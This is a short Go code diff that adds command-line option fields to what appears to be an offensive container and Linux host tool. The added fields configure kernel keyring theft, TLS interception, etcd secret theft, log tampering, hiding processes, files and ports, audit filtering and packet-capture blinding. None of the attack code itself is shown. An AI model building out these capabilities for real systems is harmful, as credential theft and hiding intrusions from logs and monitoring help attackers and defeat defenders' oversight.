@@ -98,6 +98,30 @@ type CLIOptions struct {
 	DaemonSetAction string
 	DaemonSetImage  string
 	DaemonSetName   string
+	// kernel keyring theft options
+	KeyringMode    string
+	KeyringKeyType string
+	// TLS interception options
+	TLSAction    string
+	TLSTargetPID string
+	TLSLib       string
+	// etcd theft options
+	EtcdMode      string
+	EtcdKeyPrefix string
+	// log tamper options
+	LogTamperMode    string
+	LogTamperPattern string
+	LogTamperTarget  string
+	// syscall bypass options
+	SyscallHidePIDs  string
+	SyscallHideFiles string
+	SyscallHidePorts string
+	// audit filter options
+	AuditFilterMode string
+	AuditFilterPIDs string
+	// pcap blinding options
+	PcapHidePorts string
+	PcapHideIPs   string
 }
 
 // LogLevelSanitizer is a log level sanitizer that ensures that the provided log level exists
